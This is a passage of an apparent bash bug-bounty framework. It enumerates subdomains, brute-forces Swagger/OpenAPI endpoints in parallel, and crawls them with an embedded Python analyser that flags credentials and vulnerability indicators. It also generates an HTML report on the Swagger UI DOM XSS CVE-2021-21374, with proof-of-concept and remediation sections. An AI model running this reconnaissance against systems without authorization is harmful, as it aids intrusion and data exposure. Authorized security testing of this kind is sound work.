XSS Vulnerabilities: $VULNERABLE_XSS
Sensitive Endpoints: $VULNERABLE_ENDPOINTS
Data Exposures: $SENSITIVE_DATA

## Risk Assessment
$([ $VULNERABLE_XSS -gt 0 ] && echo "🚨 CRITICAL: DOM XSS vulnerabilities confirmed")
$([ $VULNERABLE_ENDPOINTS -gt 5 ] && echo "⚠️ HIGH: Multiple sensitive endpoints exposed")
$([ $SWAGGER_FOUND -gt 0 ] && echo "ℹ️ INFO: Swagger documentation publicly accessible")

## Recommended Actions
1. Update Swagger UI to latest version (≥3.38.0)
2. Restrict Swagger access to internal networks
3. Implement proper authentication for API documentation
4. Review exposed API endpoints for sensitivity
EOF
    
    print_status "Results copied to framework directory: $results_dir"
}

# Function to perform subdomain enumeration
perform_subdomain_enumeration() {
    local domain="$1"
    local output_file="$2"
    
    print_header "🌐 SUBDOMAIN ENUMERATION"
    print_status "Target domain: $domain"
    
    local subdomains_dir="${OUTPUT_DIR}/subdomains"
    mkdir -p "$subdomains_dir"
    
    local temp_subs="${subdomains_dir}/temp_subdomains.txt"
    local validated_subs="${subdomains_dir}/validated_subdomains.txt"
    
    # Initialize files
    > "$temp_subs"
    > "$validated_subs"
    
    # Subfinder enumeration
    if command -v subfinder >/dev/null 2>&1; then
        print_status "Running subfinder enumeration..."
        subfinder -d "$domain" -silent -o "${subdomains_dir}/subfinder_results.txt" 2>/dev/null || true
        if [[ -f "${subdomains_dir}/subfinder_results.txt" ]]; then
            cat "${subdomains_dir}/subfinder_results.txt" >> "$temp_subs"
            print_success "Subfinder found $(wc -l < "${subdomains_dir}/subfinder_results.txt") subdomains"
        fi
    fi
    
    # Assetfinder enumeration
    if command -v assetfinder >/dev/null 2>&1; then
        print_status "Running assetfinder enumeration..."
        assetfinder --subs-only "$domain" > "${subdomains_dir}/assetfinder_results.txt" 2>/dev/null || true
        if [[ -f "${subdomains_dir}/assetfinder_results.txt" ]]; then
            cat "${subdomains_dir}/assetfinder_results.txt" >> "$temp_subs"
            print_success "Assetfinder found $(wc -l < "${subdomains_dir}/assetfinder_results.txt") subdomains"
        fi
    fi
    
    # Wayback machine subdomain discovery
    if command -v waybackurls >/dev/null 2>&1; then
        print_status "Extracting subdomains from Wayback Machine..."
        echo "$domain" | waybackurls 2>/dev/null | \
        grep -oE "https?://[^/]*\.$domain" | \
        sed 's|https\?://||' | \
        sort -u > "${subdomains_dir}/wayback_subdomains.txt" 2>/dev/null || true
        
        if [[ -f "${subdomains_dir}/wayback_subdomains.txt" && -s "${subdomains_dir}/wayback_subdomains.txt" ]]; then
            cat "${subdomains_dir}/wayback_subdomains.txt" >> "$temp_subs"
            print_success "Wayback found $(wc -l < "${subdomains_dir}/wayback_subdomains.txt") historical subdomains"
        fi
    fi
    
    # Additional common subdomain patterns
    print_status "Testing common subdomain patterns..."
    local common_subs=(
        "api" "swagger" "docs" "documentation" "dev" "test" "staging" 
        "admin" "internal" "private" "beta" "v1" "v2" "v3" "portal"
        "dashboard" "management" "console" "app" "apps" "services"
    )
    
    for sub in "${common_subs[@]}"; do
        echo "${sub}.${domain}" >> "$temp_subs"
    done
    
    # Remove duplicates and sort
    sort -u "$temp_subs" > "${subdomains_dir}/unique_subdomains.txt"
    local total_found=$(wc -l < "${subdomains_dir}/unique_subdomains.txt")
    SUBDOMAINS_FOUND=$total_found
    
    print_status "Total unique subdomains found: $total_found"
    
    # Validate subdomains with httpx (parallel processing)
    if command -v httpx >/dev/null 2>&1 && [[ $total_found -gt 0 ]]; then
        print_status "Validating subdomains with HTTPx..."
        
        httpx -l "${subdomains_dir}/unique_subdomains.txt" \
              -status-code \
              -title \
              -tech-detect \
              -threads "$THREADS" \
              -timeout "$TIMEOUT" \
              -silent \
              -o "$validated_subs" 2>/dev/null || true
              
        if [[ -f "$validated_subs" && -s "$validated_subs" ]]; then
            local validated_count=$(wc -l < "$validated_subs")
            print_success "Validated $validated_count live subdomains"
            
            # Extract just the URLs for further processing
            grep -oE "https?://[^[:space:]]+" "$validated_subs" | \
            sed 's/\[.*\]//' > "$output_file" 2>/dev/null || true
        else
            # Fallback: create URLs from subdomain list
            while IFS= read -r subdomain; do
                echo "https://$subdomain" >> "$output_file"
                echo "http://$subdomain" >> "$output_file"
            done < "${subdomains_dir}/unique_subdomains.txt"
        fi
    else
        # Create target list from discovered subdomains
        while IFS= read -r subdomain; do
            echo "https://$subdomain" >> "$output_file"
            echo "http://$subdomain" >> "$output_file"
        done < "${subdomains_dir}/unique_subdomains.txt"
    fi
    
    print_success "Subdomain enumeration completed"
}

# Function to perform parallel Swagger discovery
parallel_swagger_discovery() {
    local targets_file="$1"
    local output_file="$2"
    
    print_header "⚡ PARALLEL SWAGGER DISCOVERY"
    
    if [[ ! -f "$targets_file" ]]; then
        print_error "Targets file not found: $targets_file"
        return 1
    fi
    
    local target_count=$(wc -l < "$targets_file")
    print_status "Scanning $target_count targets in parallel..."
    
    # Create parallel job directory
    local parallel_dir="${OUTPUT_DIR}/parallel_jobs"
    mkdir -p "$parallel_dir"
    
    # Function to scan single target (exported for parallel)
    export -f scan_single_target
    export -f print_status print_success print_warning print_error print_found
    export OUTPUT_DIR TIMEOUT USER_AGENT PROXY RATE_LIMIT VERBOSE
    export RED GREEN YELLOW BLUE PURPLE CYAN WHITE BOLD NC
    
    if command -v parallel >/dev/null 2>&1; then
        print_status "Using GNU parallel for concurrent scanning..."
        
        parallel -j "$MAX_PARALLEL_JOBS" \
                 --timeout $((TIMEOUT * 3)) \
                 --results "$parallel_dir" \
                 scan_single_target {} \
                 < "$targets_file" 2>/dev/null || true
    else
        print_warning "GNU parallel not available, using xargs..."
        
        cat "$targets_file" | \
        xargs -I {} -P "$MAX_PARALLEL_JOBS" \
        bash -c 'scan_single_target "$@"' _ {} 2>/dev/null || true
    fi
    
    # Collect results from parallel jobs
    find "$parallel_dir" -name "stdout" -exec cat {} \; 2>/dev/null | \
    grep "^FOUND:" | sed 's/^FOUND: //' | sort -u > "$output_file" 2>/dev/null || true
    
    local found_count=$(wc -l < "$output_file" 2>/dev/null || echo "0")
    print_success "Parallel discovery completed: $found_count endpoints found"
}

# Function to scan single target (for parallel execution)
scan_single_target() {
    local target="$1"
    local wordlist="${OUTPUT_DIR}/wordlists/comprehensive-swagger.txt"
    
    [[ ! -f "$wordlist" ]] && return 0
    
    while IFS= read -r endpoint; do
        [[ "$endpoint" =~ ^#.*$ ]] || [[ -z "$endpoint" ]] && continue
        
        local url="${target}/${endpoint}"
        
        local response
        response=$(timeout "$((TIMEOUT + 2))" curl -s --max-time "$TIMEOUT" \
                  -H "User-Agent: $USER_AGENT" \
                  -w "%{http_code}|%{content_type}|%{size_download}" \
                  "$url" 2>/dev/null || echo "000||0")
        
        local content http_code content_type size_download
        content=$(echo "$response" | head -n -1)
        IFS='|' read -r http_code content_type size_download <<< "$(echo "$response" | tail -1)"
        
        if [[ "$http_code" == "200" ]] && [[ "$size_download" -gt 100 ]]; then
            if echo "$content" | grep -qiE "(swagger|openapi)" || \
               echo "$content_type" | grep -qE "(json|yaml|html)"; then
                echo "FOUND: $url"
            fi
        fi
        
        sleep $(awk "BEGIN {printf \"%.2f\", 1/$RATE_LIMIT}" 2>/dev/null || echo "0.01")
        
    done < "$wordlist"
}

# Function to integrate crawl4ai for deep content analysis
crawl4ai_analysis() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_header "🕷️ CRAWL4AI DEEP ANALYSIS"
    
    if ! command -v python3 >/dev/null 2>&1; then
        print_warning "Python3 not available, skipping crawl4ai analysis"
        return 0
    fi
    
    if ! python3 -c "import crawl4ai" 2>/dev/null; then
        print_warning "crawl4ai not installed, skipping deep analysis"
        print_status "Install with: pip install crawl4ai"
        return 0
    fi
    
    if [[ ! -f "$discovered_file" ]] || [[ ! -s "$discovered_file" ]]; then
        print_warning "No endpoints to analyze with crawl4ai"
        return 0
    fi
    
    local crawl_dir="${OUTPUT_DIR}/crawl4ai_analysis"
    mkdir -p "$crawl_dir"
    
    # Create crawl4ai analysis script
    cat > "${crawl_dir}/swagger_crawler.py" << 'EOF'
import asyncio
import sys
from pathlib import Path
from crawl4ai import AsyncWebCrawler
import json
import re

async def analyze_swagger_endpoint(url, output_dir):
    """Analyze Swagger endpoint with crawl4ai"""
    try:
        async with AsyncWebCrawler(verbose=False) as crawler:
            result = await crawler.arun(
                url=url,
                word_count_threshold=10,
                extraction_strategy="NoExtractionStrategy",
                chunking_strategy="RegexChunking",
                bypass_cache=True
            )
            
            if result.success:
                # Extract Swagger/API information
                content = result.markdown
                
                analysis = {
                    "url": url,
                    "title": result.metadata.get("title", ""),
                    "swagger_version": extract_swagger_version(content),
                    "api_endpoints": extract_api_endpoints(content),
                    "authentication": extract_auth_info(content),
                    "sensitive_data": find_sensitive_patterns(content),
                    "potential_vulns": detect_vulnerabilities(content),
                    "technologies": result.metadata.get("technologies", [])
                }
                
                # Save analysis
                filename = url.replace("https://", "").replace("http://", "").replace("/", "_")
                with open(f"{output_dir}/{filename}_analysis.json", "w") as f:
                    json.dump(analysis, f, indent=2)
                
                return analysis
                
    except Exception as e:
        print(f"Error analyzing {url}: {e}")
        return None

def extract_swagger_version(content):
    """Extract Swagger/OpenAPI version"""
    patterns = [
        r'"swagger":\s*"([^"]+)"',
        r'"openapi":\s*"([^"]+)"',
        r'swagger.*?version["\s:]*([0-9.]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def extract_api_endpoints(content):
    """Extract API endpoints from Swagger content"""
    endpoints = []
    
    # Look for paths in JSON
    path_patterns = [
        r'"(/[^"]*)":\s*\{',
        r'path["\s:]*"([^"]*)"',
        r'"url":\s*"([^"]*)"'
    ]
    
    for pattern in path_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        endpoints.extend(matches)
    
    return list(set(endpoints))

def extract_auth_info(content):
    """Extract authentication information"""
    auth_patterns = [
        "bearer", "oauth", "jwt", "api.?key", "basic.?auth", 
        "authentication", "authorization", "token"
    ]
    
    found_auth = []
    for pattern in auth_patterns:
        if re.search(pattern, content, re.IGNORECASE):
            found_auth.append(pattern)
    
    return found_auth

def find_sensitive_patterns(content):
    """Find sensitive data patterns"""
    sensitive_patterns = {
        "database": r"(mongodb|mysql|postgres|redis|database)",
        "credentials": r"(password|secret|key|credential|token)",
        "internal": r"(internal|private|admin|debug|test)",
        "urls": r"https?://[^\s<>\"]+",
        "emails": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
    }
    
    findings = {}
    for category, pattern in sensitive_patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            findings[category] = list(set(matches))
    
    return findings

def detect_vulnerabilities(content):
    """Detect potential vulnerabilities"""
    vuln_indicators = []
    
    # XSS vulnerability indicators
    if re.search(r'dompurify.*[0-9.]+', content, re.IGNORECASE):
        vuln_indicators.append("potential_xss_dompurify")
    
    # Outdated Swagger UI
    if re.search(r'swagger-ui.*3\.[1-3][0-9]\.[0-9]+', content, re.IGNORECASE):
        vuln_indicators.append("outdated_swagger_ui")
    
    # CORS misconfig indicators
    if re.search(r'access-control-allow-origin.*\*', content, re.IGNORECASE):
        vuln_indicators.append("cors_wildcard")
    
    # Debug mode indicators
    if re.search(r'debug.*true|development.*mode', content, re.IGNORECASE):
        vuln_indicators.append("debug_mode_enabled")
    
    return vuln_indicators

async def main():
    if len(sys.argv) != 3:
        print("Usage: python swagger_crawler.py <endpoints_file> <output_dir>")
        sys.exit(1)
    
    endpoints_file = sys.argv[1]
    output_dir = sys.argv[2]
    
    with open(endpoints_file, 'r') as f:
        endpoints = [line.strip() for line in f if line.strip()]
    
    print(f"Analyzing {len(endpoints)} endpoints with crawl4ai...")
    
    results = []
    for endpoint in endpoints[:10]:  # Limit to first 10 for performance
        result = await analyze_swagger_endpoint(endpoint, output_dir)
        if result:
            results.append(result)
    
    # Generate summary
    summary = {
        "total_analyzed": len(results),
        "vulnerabilities_found": sum(len(r.get("potential_vulns", [])) for r in results),
        "sensitive_data_found": sum(len(r.get("sensitive_data", {})) for r in results),
        "unique_technologies": list(set(
            tech for r in results for tech in r.get("technologies", [])
        ))
    }
    
    with open(f"{output_dir}/crawl4ai_summary.json", "w") as f:
        json.dump(summary, f, indent=2)
    
    print(f"Analysis complete: {summary}")

if __name__ == "__main__":
    asyncio.run(main())
EOF
    
    print_status "Running crawl4ai analysis on discovered endpoints..."
    
    # Run the crawler
    python3 "${crawl_dir}/swagger_crawler.py" "$discovered_file" "$crawl_dir" 2>/dev/null || {
        print_warning "crawl4ai analysis failed"
        return 0
    }
    
    # Process results
    if [[ -f "${crawl_dir}/crawl4ai_summary.json" ]]; then
        local summary=$(cat "${crawl_dir}/crawl4ai_summary.json")
        local analyzed=$(echo "$summary" | jq -r '.total_analyzed // 0' 2>/dev/null || echo "0")
        local vulns=$(echo "$summary" | jq -r '.vulnerabilities_found // 0' 2>/dev/null || echo "0")
        
        CRAWLED_PAGES=$analyzed
        ADDITIONAL_VULNS=$((ADDITIONAL_VULNS + vulns))
        
        print_success "crawl4ai analysis completed: $analyzed pages analyzed, $vulns additional vulnerabilities found"
        
        # Generate report section
        echo "# Crawl4AI Deep Analysis Results" > "$output_file"
        echo "# Analysis Date: $(date)" >> "$output_file"
        echo "" >> "$output_file"
        echo "$summary" >> "$output_file"
    else
        print_warning "crawl4ai analysis completed but no summary generated"
    fi
}

# Function to generate professional bug bounty report
generate_bug_bounty_report() {
    local target="$1"
    
    print_header "📊 GENERATING BUG BOUNTY REPORT"
    
    local report_file="${OUTPUT_DIR}/bug_bounty_report.html"
    local timestamp=$(date)
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swagger Security Assessment Report - $target</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            line-height: 1.6; 
            color: #333; 
            background: #f5f5f5;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; 
            padding: 30px; 
            border-radius: 10px; 
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
        .header .subtitle { font-size: 1.2em; opacity: 0.9; }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        .stat-card { 
            background: white; 
            padding: 20px; 
            border-radius: 10px; 
            text-align: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            transition: transform 0.2s;
        }
        .stat-card:hover { transform: translateY(-2px); }
        .stat-number { font-size: 2em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .section { 
            background: white; 
            margin-bottom: 30px; 
            border-radius: 10px; 
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .section-header { 
            background: #667eea; 
            color: white; 
            padding: 20px; 
            font-size: 1.3em; 
            font-weight: bold;
        }
        .section-content { padding: 20px; }
        .vulnerability { 
            border-left: 4px solid #e74c3c; 
            background: #fdf2f2; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 0 5px 5px 0;
        }
        .endpoint { 
            border-left: 4px solid #27ae60; 
            background: #f2fdf2; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 0 5px 5px 0;
        }
        .warning { 
            border-left: 4px solid #f39c12; 
            background: #fefbf2; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 0 5px 5px 0;
        }
        .code { 
            background: #2c3e50; 
            color: #ecf0f1; 
            padding: 15px; 
            border-radius: 5px; 
            font-family: 'Courier New', monospace; 
            overflow-x: auto;
            margin: 10px 0;
        }
        .poc { 
            background: #34495e; 
            color: #ecf0f1; 
            padding: 20px; 
            border-radius: 5px; 
            margin: 15px 0;
        }
        .severity-critical { color: #e74c3c; font-weight: bold; }
        .severity-high { color: #e67e22; font-weight: bold; }
        .severity-medium { color: #f39c12; font-weight: bold; }
        .severity-low { color: #27ae60; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
        th { background-color: #667eea; color: white; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        .footer { 
            text-align: center; 
            padding: 20px; 
            color: #666; 
            background: white; 
            border-radius: 10px; 
            margin-top: 30px;
        }
        .badge { 
            display: inline-block; 
            padding: 4px 8px; 
            border-radius: 4px; 
            font-size: 0.8em; 
            font-weight: bold; 
            color: white;
        }
        .badge-critical { background: #e74c3c; }
        .badge-high { background: #e67e22; }
        .badge-medium { background: #f39c12; }
        .badge-low { background: #27ae60; }
        .payload-box { 
            background: #f8f9fa; 
            border: 1px solid #dee2e6; 
            padding: 10px; 
            border-radius: 4px; 
            font-family: monospace; 
            word-break: break-all;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Swagger Security Assessment</h1>
            <div class="subtitle">Professional Bug Bounty Report for $target</div>
            <div style="margin-top: 15px; font-size: 0.9em;">
                <strong>Scan Date:</strong> $timestamp<br>
                <strong>Framework:</strong> Swagger Bug Bounty Hunter v3.0<br>
                <strong>Methodology:</strong> Based on kdairatchi/swagger research
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">$SUBDOMAINS_FOUND</div>
                <div class="stat-label">Subdomains Found</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$SWAGGER_FOUND</div>
                <div class="stat-label">Swagger Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$VULNERABLE_XSS</div>
                <div class="stat-label">XSS Vulnerabilities</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$VULNERABLE_ENDPOINTS</div>
                <div class="stat-label">Sensitive Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$ADDITIONAL_VULNS</div>
                <div class="stat-label">Additional Vulns</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$CRAWLED_PAGES</div>
                <div class="stat-label">Pages Analyzed</div>
            </div>
        </div>

        <div class="section">
            <div class="section-header">🔍 Executive Summary</div>
            <div class="section-content">
                <p>This report presents the findings of a comprehensive Swagger/OpenAPI security assessment conducted on <strong>$target</strong>. The assessment utilized advanced discovery techniques and exploitation methodologies based on the latest security research.</p>
                
                <h3>Key Findings:</h3>
                <ul style="margin: 15px 0; padding-left: 20px;">
                    <li><strong>$SUBDOMAINS_FOUND</strong> subdomains enumerated and validated</li>
                    <li><strong>$SWAGGER_FOUND</strong> Swagger/OpenAPI endpoints discovered</li>
                    <li><strong>$VULNERABLE_XSS</strong> DOM XSS vulnerabilities confirmed</li>
                    <li><strong>$VULNERABLE_ENDPOINTS</strong> sensitive API endpoints exposed</li>
                    <li><strong>$ADDITIONAL_VULNS</strong> additional vulnerabilities detected</li>
                    <li><strong>$CRAWLED_PAGES</strong> pages analyzed with deep content inspection</li>
                </ul>

                $([ $VULNERABLE_XSS -gt 0 ] && echo '<div class="warning"><strong>⚠️ Critical Finding:</strong> DOM-based XSS vulnerabilities were discovered that could lead to account takeover, session hijacking, and sensitive data theft.</div>')
                
                $([ $VULNERABLE_ENDPOINTS -gt 0 ] && echo '<div class="warning"><strong>⚠️ Security Risk:</strong> Sensitive API endpoints were found exposed through Swagger documentation, potentially revealing internal functionality.</div>')
            </div>
        </div>
EOF

    # Add discovered endpoints section if any found
    if [[ $SWAGGER_FOUND -gt 0 ]]; then
        cat >> "$report_file" << 'EOF'
        <div class="section">
            <div class="section-header">🎯 Discovered Swagger Endpoints</div>
            <div class="section-content">
                <p>The following Swagger/OpenAPI endpoints were discovered during the reconnaissance phase:</p>
EOF
        
        # Read discovered endpoints and add to report
        if [[ -f "${OUTPUT_DIR}/discovered_endpoints.txt" ]]; then
            while IFS= read -r endpoint; do
                [[ -z "$endpoint" ]] && continue
                cat >> "$report_file" << EOF
                <div class="endpoint">
                    <strong>📍 Endpoint:</strong> <code>$endpoint</code><br>
                    <strong>Type:</strong> $(echo "$endpoint" | grep -qE '\.(json|yaml)$' && echo "API Specification" || echo "UI Interface")<br>
                    <strong>Risk Level:</strong> $(echo "$endpoint" | grep -qiE "(admin|debug|internal)" && echo '<span class="severity-high">HIGH</span>' || echo '<span class="severity-medium">MEDIUM</span>')
                </div>
EOF
            done < "${OUTPUT_DIR}/discovered_endpoints.txt"
        fi
        
        echo '            </div>
        </div>' >> "$report_file"
    fi

    # Add XSS vulnerabilities section if any found
    if [[ $VULNERABLE_XSS -gt 0 ]]; then
        cat >> "$report_file" << 'EOF'
        <div class="section">
            <div class="section-header">🚨 XSS Vulnerabilities (CVE-2021-21374)</div>
            <div class="section-content">
                <div class="vulnerability">
                    <h3><span class="badge badge-critical">CRITICAL</span> DOM-based Cross-Site Scripting</h3>
                    <p><strong>Vulnerability Type:</strong> DOM XSS via URL parameter</p>
                    <p><strong>Affected Component:</strong> Swagger UI (versions 3.14.1 - 3.37.2)</p>
                    <p><strong>CVE:</strong> CVE-2021-21374</p>
                    
                    <h4>📋 Technical Details:</h4>
                    <p>The vulnerability exists due to an outdated DOMPurify library combined with Swagger UI's feature that allows loading remote OpenAPI specifications via URL parameters. An attacker can craft malicious specification URLs containing JavaScript that will execute in the victim's browser.</p>
                    
                    <h4>💥 Impact:</h4>
                    <ul>
                        <li>🔓 Session hijacking and cookie theft</li>
                        <li>🎭 Account takeover of authenticated users</li>
                        <li>📊 Sensitive data extraction from localStorage/sessionStorage</li>
                        <li>🕵️ Keylogging and form data theft</li>
                        <li>⚡ Client-side malware deployment</li>
                    </ul>

                    <h4>🎯 Proof of Concept:</h4>
EOF
        
        # Add XSS PoCs from results file
        if [[ -f "${OUTPUT_DIR}/xss_results.txt" ]]; then
            grep -A 10 "XSS-VULNERABLE:" "${OUTPUT_DIR}/xss_results.txt" | head -20 | while IFS= read -r line; do
                if [[ "$line" =~ ^XSS-VULNERABLE: ]]; then
                    endpoint=$(echo "$line" | cut -d' ' -f2-)
                    echo "                    <div class=\"poc\">" >> "$report_file"
                    echo "                        <strong>🎯 Vulnerable Endpoint:</strong> $endpoint" >> "$report_file"
                elif [[ "$line" =~ ^PAYLOAD: ]]; then
                    payload=$(echo "$line" | cut -d' ' -f2-)
                    echo "                        <div class=\"payload-box\">$payload</div>" >> "$report_file"
                elif [[ "$line" =~ ^TEST-URL: ]]; then
                    test_url=$(echo "$line" | cut -d' ' -f2-)
                    echo "                        <strong>🔗 Test URL:</strong><br>" >> "$report_file"
                    echo "                        <div class=\"code\">curl -v '$test_url'</div>" >> "$report_file"
                    echo "                    </div>" >> "$report_file"
                fi
            done
        fi
        
        cat >> "$report_file" << 'EOF'
                    
                    <h4>🛡️ Remediation:</h4>
                    <div class="code">
# Update Swagger UI to the latest version
npm update swagger-ui-dist@^4.15.0

# Or implement Content Security Policy (CSP)
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';

# Disable remote specification loading
swaggerOptions = {
    url: null,
    configUrl: null
};
                    </div>
                </div>
            </div>
        </div>
EOF
    fi

    # Add API analysis section
    cat >> "$report_file" << 'EOF'
        <div class="section">
            <div class="section-header">📊 API Security Analysis</div>
            <div class="section-content">
                <p>Analysis of exposed API specifications revealed the following security concerns:</p>
                
EOF

    if [[ -f "${OUTPUT_DIR}/api_analysis.txt" ]]; then
        # Process API analysis results
        sensitive_count=$(grep -c "SENSITIVE:" "${OUTPUT_DIR}/api_analysis.txt" 2>/dev/null || echo "0")
        endpoint_count=$(grep -c "ENDPOINTS-FOUND:" "${OUTPUT_DIR}/api_analysis.txt" 2>/dev/null || echo "0")
        
        cat >> "$report_file" << EOF
                <table>
                    <tr>
                        <th>Metric</th>
                        <th>Count</th>
                        <th>Risk Level</th>
                    </tr>
                    <tr>
                        <td>API Specifications Found</td>
                        <td>$endpoint_count</td>
                        <td><span class="severity-medium">MEDIUM</span></td>
                    </tr>
                    <tr>
                        <td>Sensitive Endpoints</td>
                        <td>$VULNERABLE_ENDPOINTS</td>
                        <td><span class="severity-high">HIGH</span></td>
                    </tr>
                    <tr>
                        <td>Sensitive Data Patterns</td>
                        <td>$SENSITIVE_DATA</td>
                        <td><span class="severity-high">HIGH</span></td>
                    </tr>
                </table>
EOF

        # Add specific sensitive endpoints found
        if [[ $VULNERABLE_ENDPOINTS -gt 0 ]]; then
            echo "                <h4>🚨 Sensitive Endpoints Discovered:</h4>" >> "$report_file"
            grep "SENSITIVE:" "${OUTPUT_DIR}/api_analysis.txt" | head -10 | while IFS= read -r line; do
                endpoint=$(echo "$line" | sed 's/.*SENSITIVE: //')
                echo "                <div class=\"warning\">⚠️ <code>$endpoint</code></div>" >> "$report_file"
            done
        fi
    fi

    echo '            </div>
        </div>' >> "$report_file"

    # Add recommendations section
    cat >> "$report_file" << 'EOF'
        <div class="section">
            <div class="section-header">🛡️ Security Recommendations</div>
            <div class="section-content">
                <h3>Immediate Actions Required:</h3>
                <ol style="padding-left: 20px;">
                    <li><strong>Update Swagger UI:</strong> Upgrade to version 3.38.0 or later to patch XSS vulnerabilities</li>
                    <li><strong>Remove from Production:</strong> Swagger documentation should not be accessible in production environments</li>
                    <li><strong>Implement Access Controls:</strong> Restrict access to internal networks or authenticated users only</li>
                    <li><strong>Content Security Policy:</strong> Implement strict CSP headers to prevent XSS exploitation</li>
                </ol>

                <h3>Long-term Security Improvements:</h3>
                <ul style="padding-left: 20px;">
                    <li>Regular security audits of API documentation exposure</li>
                    <li>Automated scanning for Swagger endpoints in CI/CD pipelines</li>
                    <li>Security training for developers on API documentation risks</li>
                    <li>Implementation of API gateway with proper authentication</li>
                </ul>

                <div class="code">
# Nginx configuration to restrict Swagger access
location /swagger-ui/ {
    allow 10.0.0.0/8;      # Internal network
    allow 192.168.0.0/16;  # Private network  
    deny all;
    
    # Additional security headers
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header Content-Security-Policy "default-src 'self'";
}
                </div>
            </div>
        </div>

        <div class="section">
            <div class="section-header">📋 Technical Appendix</div>
            <div class="section-content">
                <h3>Tools and Techniques Used:</h3>
                <ul style="padding-left: 20px;">
                    <li><strong>Discovery:</strong> Comprehensive wordlist from kdairatchi/swagger repository</li>
                    <li><strong>XSS Testing:</strong> Advanced DOMPurify bypass payloads</li>
                    <li><strong>API Analysis:</strong> JSON/YAML specification parsing and endpoint extraction</li>
                    <li><strong>Verification:</strong> Manual confirmation of all findings</li>
                </ul>

                <h3>References:</h3>
                <ul style="padding-left: 20px;">
                    <li><a href="https://github.com/swagger-api/swagger-ui/security/advisories/GHSA-qrmm-w75w-3wpx">CVE-2021-21374 Advisory</a></li>
                    <li><a href="https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/">Vidoc Security Research</a></li>
                    <li><a href="https://github.com/kdairatchi/swagger">kdairatchi/swagger Repository</a></li>
                    <li><a href="https://owasp.org/www-project-api-security/">OWASP API Security Project</a></li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <p><strong>Swagger Bug Bounty Hunter v3.0</strong></p>
            <p>Professional security assessment framework for responsible disclosure</p>
            <p style="margin-top: 10px; font-size: 0.9em; color: #999;">
                Report generated on $timestamp<br>
                This assessment was conducted for authorized security testing purposes only
            </p>
        </div>
    </div>
</body>
</html>
EOF

    print_success "Bug bounty report generated: $report_file"
}

# Function to display final statistics and summary
display_final_summary() {
    local target="$1"
    
    print_header "📊 FINAL ASSESSMENT SUMMARY"
    
    echo -e "${WHITE}${BOLD}Target:${NC} $target"
    echo -e "${WHITE}${BOLD}Scan Completed:${NC} $(date)"
    echo ""
    
    echo -e "${CYAN}${BOLD}🎯 DISCOVERY RESULTS:${NC}"
    [[ "$SUBDOMAIN_SCAN" == true ]] && echo -e "  Subdomains Found: ${BLUE}$SUBDOMAINS_FOUND${NC}"
    echo -e "  Swagger Endpoints Found: ${GREEN}$SWAGGER_FOUND${NC}"
    [[ "$CRAWL4AI_ENABLED" == true ]] && echo -e "  Pages Analyzed: ${PURPLE}$CRAWLED_PAGES${NC}"
    echo ""
    
    echo -e "${RED}${BOLD}🚨 VULNERABILITIES FOUND:${NC}"
    echo -e "  XSS Vulnerabilities: ${RED}$VULNERABLE_XSS${NC}"
    echo -e "  Sensitive Endpoints: ${YELLOW}$VULNERABLE_ENDPOINTS${NC}"
    echo -e "  Data Exposures: ${YELLOW}$SENSITIVE_DATA${NC}"
    echo -e "  Additional Vulnerabilities: ${RED}$ADDITIONAL_VULNS${NC}"
    echo ""
    
    if [[ $VULNERABLE_XSS -gt 0 ]]; then
        echo -e "${RED}${BOLD}⚠️  CRITICAL FINDINGS DETECTED${NC}"
        echo -e "${RED}   DOM XSS vulnerabilities confirmed - Immediate action required${NC}"
        echo ""
    fi
    
    echo -e "${CYAN}${BOLD}📁 OUTPUT FILES:${NC}"
    echo -e "  Main Report: ${GREEN}${OUTPUT_DIR}/bug_bounty_report.html${NC}"
    echo -e "  Discovery Results: ${BLUE}${OUTPUT_DIR}/discovery_results.txt${NC}"
    echo -e "  XSS Results: ${BLUE}${OUTPUT_DIR}/xss_results.txt${NC}"
    echo -e "  API Analysis: ${BLUE}${OUTPUT_DIR}/api_analysis.txt${NC}"
    echo -e "  Framework Integration: ${PURPLE}${OUTPUT_DIR}/framework_integration/${NC}"
